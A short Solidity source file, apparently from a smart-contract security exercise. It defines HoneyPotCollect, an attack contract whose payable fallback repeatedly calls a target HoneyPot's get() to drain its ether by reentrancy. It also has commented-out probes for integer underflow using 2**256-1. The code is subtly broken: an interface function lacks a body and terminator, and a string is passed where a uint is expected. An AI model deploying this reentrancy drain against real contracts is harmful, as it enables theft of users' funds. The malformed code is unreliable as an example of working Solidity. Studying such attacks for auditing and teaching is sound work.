pragma solidity ^0.4.8;

//import "./HoneyPot.sol";



contract HoneyPot {
    
    function put() payable{}
    function showstring(string num) returns (string _underflow)
    function show(uint  num) returns (uint _underflow) {}
    function get() {}
    
}



contract HoneyPotCollect {
  HoneyPot public honeypot;

event ff();
event gg();
  function HoneyPotCollect (address _honeypot) {
    ff();
    honeypot = HoneyPot(_honeypot);
     gg();
  }

 // function kill () {
 //   suicide(msg.sender);
 // }


 function put() payable{

   honeypot.put.value(msg.value)();
 }

event cc();
event dd();
event ee();
  function collect() payable {
   
    honeypot.put.value(msg.value)();
  
    honeypot.get();
   
   
  }

  event lookVar();
event zz();
  function callshow() returns (uint _underflow) {
 
  lookVar();
  //  if(honeypot.show('123')==0)
 //   {
 //      zz();
 //   }
    //uint aa = honeypot.show(2**256-1);
    return honeypot.show('string');
  }


 // function callshow2() returns (uint _underflow) {
 //   return honeypot.show(1000);
 // }



  event callfallback();
  event end_fallback();
  function () payable {

    callfallback();
    
    if (honeypot.balance >= msg.value) {
       honeypot.get();
    }

    end_fallback();
  }
}
